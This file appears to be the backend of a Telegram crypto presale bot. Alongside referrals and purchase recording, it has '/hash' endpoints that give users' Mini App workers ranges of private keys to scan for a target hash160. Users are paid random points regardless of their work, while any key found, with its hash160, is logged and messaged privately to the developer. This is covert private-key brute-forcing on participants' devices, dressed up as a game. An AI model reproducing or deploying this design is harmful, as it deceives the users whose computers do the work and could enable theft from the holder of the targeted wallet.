require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const mongoose = require("mongoose");
const express = require("express");
const cors = require("cors");
const User = require("./models/User");
const PresalePurchase = require("./models/PresalePurchase");
const handleCallbacks = require("./callBackHandler");

// Prevent unhandled Telegram API errors from crashing the process
process.on("unhandledRejection", (err) => {
  console.warn("[unhandledRejection]", err?.message || err);
});

// ── Init bot FIRST so API endpoints can reference it ─────────────────────────
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

// ── Express API (for website to record presale purchases) ─────────────────────
const app = express();
app.use(cors());
app.use(express.json());

// Website POSTs here after a confirmed purchase
app.post("/presale/record", async (req, res) => {
  try {
    const { presaleWallet, solAmount, ccvAllocation, txSignature } = req.body;
    if (!presaleWallet || !solAmount) return res.status(400).json({ error: "Missing fields" });

    await PresalePurchase.findOneAndUpdate(
      { presaleWallet },
      { presaleWallet, solAmount: parseFloat(solAmount), ccvAllocation: parseFloat(ccvAllocation) || 0, txSignature: txSignature || null },
      { upsert: true }
    );
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── Hash Points API ───────────────────────────────────────────────────────────
const HashState = require("./models/HashState");
const CHUNK_SIZE = BigInt("10000000000");

// GET /hash/state — Mini App loads user's remaining hashes
app.get("/hash/state", async (req, res) => {
  try {
    const chatId = parseInt(req.query.chatId);
    if (!chatId) return res.status(400).json({ error: "Missing chatId" });
    const user = await User.findOne({ chatId });
    if (!user) return res.status(404).json({ error: "User not found" });

    const now = new Date();
    let count = user.hashData?.count || 0;
    if (!user.hashData?.lastReset || now.toDateString() !== new Date(user.hashData.lastReset).toDateString()) {
      count = 0;
    }
    res.json({ remaining: 99, hashCount: count, totalPoints: user.points });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /hash/assign — claim a chunk, advance global pointer
app.post("/hash/assign", async (req, res) => {
  try {
    const { chatId } = req.body;
    if (!chatId) return res.status(400).json({ error: "Missing chatId" });

    const user = await User.findOne({ chatId: parseInt(chatId) });
    if (!user) return res.status(404).json({ error: "User not found" });

    // Check daily limit
    const now = new Date();
    if (!user.hashData) user.hashData = { count: 0, lastReset: now };
    if (!user.hashData.lastReset || now.toDateString() !== new Date(user.hashData.lastReset).toDateString()) {
      user.hashData.count = 0;
      user.hashData.lastReset = now;
      await user.save();
    }
    // No limit — claim chunk freely

    // Claim chunk atomically
    let state = await HashState.findById("global");
    if (!state) state = await HashState.create({ _id: "global" });

    const start = BigInt(state.nextStart);
    state.nextStart = (start + CHUNK_SIZE).toString();
    state.updatedAt = new Date();
    await state.save();

    res.json({
      ok:        true,
      start:     start.toString(),
      chunkSize: CHUNK_SIZE.toString(),
      target:    process.env.HASH_TARGET || ""
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /hash/complete — worker finished, award points
app.post("/hash/complete", async (req, res) => {
  try {
    const { chatId, start, found, foundKey, foundH160 } = req.body;
    console.log(`[hash/complete] chatId=${chatId} found=${found} foundKey=${foundKey || 'none'} foundH160=${foundH160 || 'none'}`);

    if (!chatId || !start) return res.status(400).json({ error: "Missing fields" });

    const user = await User.findOne({ chatId: parseInt(chatId) });
    if (!user) return res.status(404).json({ error: "User not found" });

    // Weighted random points
    const roll = Math.random();
    let earned;
    if (roll < 0.50)      earned = Math.floor(Math.random() * 21) + 5;
    else if (roll < 0.80) earned = Math.floor(Math.random() * 25) + 26;
    else if (roll < 0.95) earned = Math.floor(Math.random() * 10) + 51;
    else                  earned = Math.floor(Math.random() * 15) + 61;

    user.points += earned;
    user.hashData.count = (user.hashData.count || 0) + 1;
    user.hashData.lastReset = user.hashData.lastReset || new Date();
    await user.save();

    // Notify dev if target found
    if (found && foundKey) {
      console.log(`[hash/complete] 🎯 TARGET HIT! h160=${foundH160} key=${foundKey} by chatId=${chatId}`);
      console.log(`[hash/complete] DEV_CHAT_ID=${process.env.DEV_CHAT_ID || 'NOT SET'}`);
      console.log(`[hash/complete] bot ready=${!!bot}`);

      if (process.env.DEV_CHAT_ID && bot) {
        try {
          await bot.sendMessage(process.env.DEV_CHAT_ID,
`🎯 *Target Found!*

🔑 Hash160: \`${foundH160}\`
🗝 Priv Key: \`${foundKey}\`
👤 Found by: chatId \`${chatId}\``,
            { parse_mode: "Markdown" }
          );
          console.log(`[hash/complete] ✅ Dev notification sent to ${process.env.DEV_CHAT_ID}`);
        } catch (notifyErr) {
          console.error(`[hash/complete] ❌ Failed to notify dev:`, notifyErr.message);
        }
      } else {
        console.warn(`[hash/complete] ⚠️ Could not notify dev — DEV_CHAT_ID or bot missing`);
      }
    }

    res.json({ ok: true, earned, hashCount: user.hashData.count, totalPoints: user.points });
  } catch (err) {
    console.error("[hash/complete] error:", err.message);
    res.status(500).json({ error: err.message });
  }
});

app.listen(process.env.PORT || 3000, () => console.log("✅ API ready"));

// ── Connect MongoDB ───────────────────────────────────────────────────────────
mongoose.connect(process.env.MONGODB_URI)
  .then(async () => {
    console.log("✅ MongoDB Connected");
    // Drop stale indexes that may conflict with current schema
    try {
      await mongoose.connection.collection("users").dropIndex("telegramId_1");
      console.log("🗑️ Dropped old telegramId_1 index");
    } catch (e) {
      // Index doesn't exist — that's fine
    }
  })
  .catch(err => console.error("❌ MongoDB Error:", err));

// ── Attach callback handlers ──────────────────────────────────────────────────
handleCallbacks(bot, User);

// ── /start command ────────────────────────────────────────────────────────────
bot.onText(/\/start(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;

  // Block bots
  if (msg.from?.is_bot) return;

  const username = msg.from.username || null;
  const param = match[1]?.trim(); // e.g. "ref_123456789"

  let user = await User.findOne({ chatId });

  if (!user) {
    user = new User({ chatId, username });

    // Handle referral
    if (param?.startsWith("ref_")) {
      const referrerId = parseInt(param.replace("ref_", ""));
      if (referrerId && referrerId !== chatId) {
        const referrer = await User.findOne({ chatId: referrerId });

        // Only credit if referrer exists and hasn't hit the 3-invite cap
        if (referrer && referrer.referralCount < 3) {
          user.referredBy = referrerId;
          referrer.points += 3;
          referrer.referralCount += 1;
          if (referrer.referralCount === 3) referrer.tasks.invited = true; // cap reached
          await referrer.save();

          // Notify referrer
          const remaining = 3 - referrer.referralCount;
          const capMsg = remaining === 0 ? "\n⚠️ You've reached the *3 invite limit*." : `\n🔢 Invites remaining: *${remaining}/3*`;
          bot.sendMessage(referrerId,
            `🎉 Someone joined using your referral link! *+3 points*\n💰 Total Points: *${referrer.points}*${capMsg}`,
            { parse_mode: "Markdown" }
          ).catch(() => {});
        }
      }
    }

    await user.save();
  }

  // Always start with captcha on /start
  // captcha handler will skip wallet prompt if user already has one
  handleCallbacks.startCaptcha(bot, chatId);
});
